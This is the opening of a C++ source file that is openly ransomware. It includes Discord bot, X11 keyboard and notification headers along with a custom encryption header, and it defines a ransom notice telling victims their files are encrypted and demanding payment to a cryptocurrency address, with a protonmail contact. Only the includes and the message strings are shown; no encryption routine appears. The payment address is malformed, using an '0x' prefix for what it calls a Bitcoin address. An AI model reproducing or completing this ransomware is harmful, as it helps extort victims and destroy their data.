#include <libnotify/notify.h>
#include <dpp/dpp.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>
#include <thread>
#include <chrono>
#include <iostream>
#include <string>
#include <stdexcept>
#include <memory>
#include <cstdio>
#include <unistd.h>
#include <functional>
#include <fstream>
#include "encrypt/encrypt.h"
#include <array>

const char* notify_tittle = "Ransom Productions C";
    const char* encrypt_message = ":warning: Warning! Your system is encrypted. Pay to regain access to files."
                                " Ransomware is a threat; understand risks."
                                " Don't alter files or decrypt data; risk loss or damage."
                                " To restore files, pay to Bitcoin address: 0x164593446094360439."
                                " After payment, email ransomprocs@protonmail.com for decryption.";